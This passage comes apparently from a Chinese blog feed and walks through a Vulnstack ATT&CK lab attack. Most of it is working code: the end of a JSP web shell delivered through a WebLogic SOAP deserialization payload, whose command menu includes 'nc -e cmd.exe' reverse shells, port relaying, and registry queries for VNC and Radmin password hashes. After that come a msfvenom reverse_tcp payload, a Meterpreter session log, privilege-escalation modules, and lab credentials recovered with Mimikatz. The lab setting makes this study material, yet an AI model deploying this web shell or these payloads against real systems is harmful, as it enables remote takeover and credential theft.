&#125;,500);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;h2&gt;Shell OnLine &amp;raquo;&lt;/h2&gt;&lt;br/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" target=\"</span>echo\<span class="string">" onsubmit=\"</span>$(<span class="comment">'cmd').focus()\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;input type=\"</span>submit\<span class="string">" value=\"</span> start \<span class="string">" class=\"</span>bt\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;input type=\"</span>text\<span class="string">" name=\"</span>exe\<span class="string">" style=\"</span>width:<span class="number">300</span>px\<span class="string">" class=\"</span>input\<span class="string">" value=\"</span>c:\\windows\\system32\\cmd.exe\<span class="string">"/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>online\<span class="string">"/&gt;&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>start\<span class="string">"/&gt;&lt;span class=\"</span>tip\<span class="string">"&gt;Notice ! If You Are Using IE , You Must Input A Command First After You Start Or You Will Not See The Echo&lt;/span&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;hr/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;iframe class=\"</span>secho\<span class="string">" name=\"</span>echo\<span class="string">" src=\"</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;/iframe&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" onsubmit=\"</span>this.submit();$(<span class="comment">'cmd').value='';return false;\" target=\"asyn\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input type=\"</span>text\<span class="string">" id=\"</span>cmd\<span class="string">" name=\"</span>cmd\<span class="string">" class=\"</span>input\<span class="string">" style=\"</span>width:<span class="number">80</span>%\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input name=\"</span>o\<span class="string">" id=\"</span>o\<span class="string">" type=\"</span>hidden\<span class="string">" value=\"</span>online\<span class="string">"/&gt;&lt;input type=\"</span>hidden\<span class="string">" id=\"</span>ddtype\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>ecmd\<span class="string">"/&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;select onchange=\"</span>$(<span class="comment">'cmd').value = this.value;$('cmd').focus()\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>\<span class="string">" selected&gt; &lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>uname -a\<span class="string">"&gt;uname -a&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>cat /etc/issue\<span class="string">"&gt;issue&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>cat /etc/passwd\<span class="string">"&gt;passwd&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>netstat -an\<span class="string">"&gt;netstat -an&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net user\<span class="string">"&gt;net user&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>tasklist\<span class="string">"&gt;tasklist&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>tasklist /svc\<span class="string">"&gt;tasklist /svc&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net start\<span class="string">"&gt;net start&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net <span class="keyword">stop</span> policyagent /yes\<span class="string">"&gt;net stop&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>nbtstat -A IP\<span class="string">"&gt;nbtstat -A&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value='reg query \"</span>HKLM\\System\\CurrentControlSet\\Control\\Terminal <span class="built_in">Server</span>\\WinStations\\RDP-Tcp\<span class="string">" /v \"</span>PortNumber\<span class="string">"'&gt;reg query&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value='reg query \"</span>HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\\v2<span class="number">.0</span>\\<span class="built_in">Server</span>\\Parameters\\\<span class="string">" /v \"</span>Parameter\<span class="string">"'&gt;radmin hash&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value='reg query \"</span>HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4\<span class="string">" /v \"</span>password\<span class="string">"'&gt;vnc hash&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>nc -e cmd.exe <span class="number">192.168</span><span class="number">.230</span><span class="number">.1</span> <span class="number">4444</span>\<span class="string">"&gt;nc&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>lcx -slave <span class="number">192.168</span><span class="number">.230</span><span class="number">.1</span> <span class="number">4444</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span>\<span class="string">"&gt;lcx&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>systeminfo\<span class="string">"&gt;systeminfo&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net localgroup\<span class="string">"&gt;view groups&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"						&lt;option value=\"</span>net localgroup administrators\<span class="string">"&gt;view admins&lt;/option&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;/select&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input type=\"</span>checkbox\<span class="string">" checked=\"</span>checked\<span class="string">" id=\"</span>autoscroll\<span class="string">"&gt;Auto Scroll"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"					&lt;input type=\"</span>button\<span class="string">" value=\"</span><span class="keyword">Stop</span>\<span class="string">" class=\"</span>bt\<span class="string">" onclick=\"</span>$(<span class="comment">'ddtype').value='stop';this.form.submit()\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"				&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			&lt;iframe style=\"</span>display:none\<span class="string">" name=\"</span>asyn\<span class="string">"&gt;&lt;/iframe&gt;"</span></span></span><br><span class="line"><span class="vbscript">);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"    &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> OnLineInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> type = <span class="built_in">request</span>.getParameter(<span class="string">"type"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(type))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">"start"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> exe = <span class="built_in">request</span>.getParameter(<span class="string">"exe"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(exe))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">Process pro = Runtime.getRuntime().exec(exe);</span></span><br><span class="line"><span class="vbscript">ByteArrayOutputStream outs = <span class="keyword">new</span> ByteArrayOutputStream();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setContentLength(<span class="number">100000000</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setContentType(<span class="string">"text/html;charset="</span>+Charset.defaultCharset().name());</span></span><br><span class="line"><span class="vbscript">OnLineProcess olp = <span class="keyword">new</span> OnLineProcess(pro);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(SHELL_ONLINE,olp);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> OnLineConnector(<span class="keyword">new</span> ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),<span class="string">"exeOclientR"</span>,olp).start();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> OnLineConnector(pro.getInputStream(),<span class="built_in">response</span>.getOutputStream(),<span class="string">"exeRclientO"</span>,olp).start();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">new</span> OnLineConnector(pro.getErrorStream(),<span class="built_in">response</span>.getOutputStream(),<span class="string">"exeRclientO"</span>,olp).start();//错误信息流。</span></span><br><span class="line"><span class="vbscript">Thread.sleep(<span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equals(<span class="string">"ecmd"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">Object o = JSession.getAttribute(SHELL_ONLINE);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> cmd = <span class="built_in">request</span>.getParameter(<span class="string">"cmd"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(cmd))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">OnLineProcess olp = (OnLineProcess)o;</span></span><br><span class="line"><span class="vbscript">olp.setCmd(cmd);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">Object o = JSession.getAttribute(SHELL_ONLINE);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (o == <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">OnLineProcess olp = (OnLineProcess)o;</span></span><br><span class="line"><span class="vbscript">olp.<span class="keyword">stop</span>();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">static&#123;</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"script"</span>,<span class="keyword">new</span> ScriptInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"before"</span>,<span class="keyword">new</span> BeforeInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"after"</span>,<span class="keyword">new</span> AfterInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"deleteBatch"</span>,<span class="keyword">new</span> DeleteBatchInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"clipboard"</span>,<span class="keyword">new</span> ClipBoardInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vRemoteControl"</span>,<span class="keyword">new</span> VRemoteControlInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"gc"</span>,<span class="keyword">new</span> GcInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vPortScan"</span>,<span class="keyword">new</span> VPortScanInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"portScan"</span>,<span class="keyword">new</span> PortScanInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vConn"</span>,<span class="keyword">new</span> VConnInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"dbc"</span>,<span class="keyword">new</span> DbcInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"executesql"</span>,<span class="keyword">new</span> ExecuteSQLInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vLogin"</span>,<span class="keyword">new</span> VLoginInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"login"</span>,<span class="keyword">new</span> LoginInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"filelist"</span>, <span class="keyword">new</span> FileListInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"logout"</span>,<span class="keyword">new</span> LogoutInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"upload"</span>,<span class="keyword">new</span> UploadInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"copy"</span>,<span class="keyword">new</span> CopyInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"bottom"</span>,<span class="keyword">new</span> BottomInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vCreateFile"</span>,<span class="keyword">new</span> VCreateFileInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vEdit"</span>,<span class="keyword">new</span> VEditInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"createFile"</span>,<span class="keyword">new</span> CreateFileInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vEditProperty"</span>,<span class="keyword">new</span> VEditPropertyInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"editProperty"</span>,<span class="keyword">new</span> EditPropertyInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vs"</span>,<span class="keyword">new</span> VsInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"shell"</span>,<span class="keyword">new</span> ShellInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"down"</span>,<span class="keyword">new</span> DownInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vd"</span>,<span class="keyword">new</span> VdInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"downRemote"</span>,<span class="keyword">new</span> DownRemoteInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"index"</span>,<span class="keyword">new</span> IndexInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"mkdir"</span>,<span class="keyword">new</span> MkDirInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"move"</span>,<span class="keyword">new</span> MoveInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"removedir"</span>,<span class="keyword">new</span> RemoteDirInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"packBatch"</span>,<span class="keyword">new</span> PackBatchInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"pack"</span>,<span class="keyword">new</span> PackInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"unpack"</span>,<span class="keyword">new</span> UnPackInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vmp"</span>,<span class="keyword">new</span> VmpInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vbc"</span>,<span class="keyword">new</span> VbcInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"backConnect"</span>,<span class="keyword">new</span> BackConnectInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"jspEnv"</span>,<span class="keyword">new</span> JspEnvInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"smp"</span>,<span class="keyword">new</span> SmpInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"mapPort"</span>,<span class="keyword">new</span> MapPortInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"top"</span>,<span class="keyword">new</span> TopInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vso"</span>,<span class="keyword">new</span> VOnLineShellInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"online"</span>,<span class="keyword">new</span> OnLineInvoker());</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> o = <span class="built_in">request</span>.getParameter(<span class="string">"o"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(o)) &#123;</span></span><br><span class="line"><span class="vbscript">Invoker <span class="keyword">in</span> = ins.<span class="keyword">get</span>(o);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="keyword">in</span> == <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="keyword">in</span>.doBefore()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"folder"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(path))</span></span><br><span class="line"><span class="vbscript">session.setAttribute(CURRENT_DIR,path);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"before"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"script"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"top"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!<span class="keyword">in</span>.doAfter()) &#123;</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"bottom"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"after"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;					</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span></span><br><span class="line"><span class="vbscript">e.printStackTrace(<span class="keyword">new</span> PrintStream(bout));</span></span><br><span class="line"><span class="vbscript">session.setAttribute(CURRENT_DIR,SHELL_DIR);</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,Util.htmlEncode(<span class="keyword">new</span> <span class="built_in">String</span>(bout.toByteArray())).<span class="built_in">replace</span>(<span class="string">"\n"</span>,<span class="string">"&lt;br/&gt;"</span>),<span class="string">"left"</span>);</span></span><br><span class="line"><span class="vbscript">bout.close();</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"bottom"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"after"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">]]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p></code></pre></p>
</details>
然后在上冰蝎马，好使了  也不知道是什么原因 有可能是有空格???
接下来用冰蝎上传msf的exe文件 使用msf监听 并运行

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="number">5</span> -b <span class="string">'\x00'</span> LHOST=<span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f exe &gt; abc.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> lhost <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span>:<span class="number">4444</span> </span><br><span class="line">[*] Sending stage (<span class="number">53906</span> bytes) to <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span>:<span class="number">49490</span>) at <span class="number">2020</span><span class="number">-03</span><span class="number">-11</span> <span class="number">22</span>:<span class="number">13</span>:<span class="number">40</span> <span class="number">-0400</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WEB\de1ay</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: The environment <span class="keyword">is</span> incorrect. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br></pre></td></tr></table></figure>
<p>进去之后是低权用户无法提权 使用Bypass UAC</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac  <span class="comment">//失败</span></span><br><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ask  <span class="comment">//失败</span></span><br><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac_injection <span class="comment">//失败</span></span><br><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac_eventvwr <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_comhijack <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_dotnet_profiler <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_eventvwr <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_fodhelper <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_injection_winsxs <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_sdclt <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_silentcleanup <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_sluihijack <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_vbs <span class="comment">//失败</span></span><br></pre></td></tr></table></figure>
<p>用这个模块检测漏洞</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="keyword">post</span>/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>

<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_eventvwr  <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ikeext_service  <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms10_092_schelevator <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms13_053_schlamperei <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms13_081_track_popup_menu <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms14_058_track_popup_menu</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms15_051_client_copy_image</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms16_075_reflection</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms16_075_reflection_juicy</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure>
<p>也不知道为什么  msf的ms14-058就打不进去  cs的就可以<br>用cs提权到system权限</p>
<h2 id="渗透PC、DC"><a href="#渗透PC、DC" class="headerlink" title="渗透PC、DC"></a>渗透PC、DC</h2><p>使用cs的mimikatz读密码<br>username:de1ay<br>password:fuck!@#123</p>
<p>DC<br>username:mssql<br>password:1qaz@WSX</p>
]]></content>
  </entry>
  <entry>
    <title>Vlunstack ATT&amp;CK实战系列0×1</title>
    <url>/posts/1cb8ad01.html</url>
